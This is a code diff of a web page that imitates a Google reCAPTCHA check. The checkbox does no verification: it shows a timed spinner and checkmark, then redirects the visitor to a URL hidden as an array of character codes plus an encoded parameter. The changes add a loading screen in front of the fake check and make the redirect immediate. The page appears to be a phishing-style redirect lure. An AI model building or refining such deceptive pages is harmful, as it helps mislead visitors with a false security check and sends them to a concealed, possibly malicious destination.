@@ -24,6 +24,7 @@
       padding: 10px 15px;
       width: 300px;
       box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      display: none; /* Hidden initially */
     }
 
     .recaptcha-header {
@@ -138,11 +139,14 @@
       text-decoration: underline;
     }
 
-    /* Loading Screen Styles (hidden by default) */
+    /* Loading Screen Styles (shown first) */
     .loading-screen {
-      display: none;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
       text-align: center;
-      opacity: 0;
+      opacity: 1;
       animation: fadeIn 0.5s ease forwards;
     }
 
@@ -175,7 +179,13 @@
   </style>
 </head>
 <body>
-  <!-- CAPTCHA Verification (shown by default) -->
+  <!-- Loading Screen (shown first) -->
+  <div class="loading-screen" id="loadingScreen">
+    <img class="logo" src="logo.png" alt="Loading">
+    <div class="loading-text">Loading...</div>
+  </div>
+
+  <!-- CAPTCHA Verification (hidden initially) -->
   <div class="recaptcha-container" id="captchaContainer">
     <div class="recaptcha-header">
       <div class="recaptcha-checkbox" id="recaptchaCheckbox">
@@ -205,12 +215,6 @@
     </div>
   </div>
 
-  <!-- Loading Screen (hidden until CAPTCHA is verified) -->
-  <div class="loading-screen" id="loadingScreen">
-    <img class="logo" src="logo.png" alt="Loading">
-    <div class="loading-text">Authenticating...</div>
-  </div>
-
   <script>
     document.addEventListener('DOMContentLoaded', function() {
       const checkbox = document.getElementById('checkbox');
@@ -219,27 +223,28 @@
       const loadingScreen = document.getElementById('loadingScreen');
       let isVerified = false;
 
+      // Show loading screen first for 2 seconds
+      setTimeout(() => {
+        loadingScreen.style.display = 'none';
+        captchaContainer.style.display = 'block';
+      }, 2000);
+
       recaptchaCheckbox.addEventListener('click', function() {
         if (!isVerified) {
           // Show loading spinner
           checkbox.classList.add('loading');
-          
+
           // Verification process (2 seconds)
           setTimeout(() => {
             // Show verification checkmark
             checkbox.classList.remove('loading');
             checkbox.classList.add('checked');
             isVerified = true;
-            
-            // Show loading screen after verification (0.7 second delay)
+
+            // Show green tick for 2 seconds before redirecting
             setTimeout(() => {
-              captchaContainer.style.display = 'none';
-              loadingScreen.style.display = 'block';
-              loadingScreen.style.opacity = '1';
-              
-              // Start URL compilation and redirection after loading screen is shown
               compileAndRedirect();
-            }, 700);
+            }, 2000);
           }, 2000);
         }
       });
@@ -261,10 +266,8 @@
         const baseUrl = parts.map(c => String.fromCharCode(c)).join('');
         const targetUrl = baseUrl + encodedParam;
 
-        // Redirect after 2 seconds of showing loading screen
-        setTimeout(function() {
-          window.location.href = targetUrl;
-        }, 2000);
+        // Redirect immediately
+        window.location.href = targetUrl;
       }
     });
   </script>
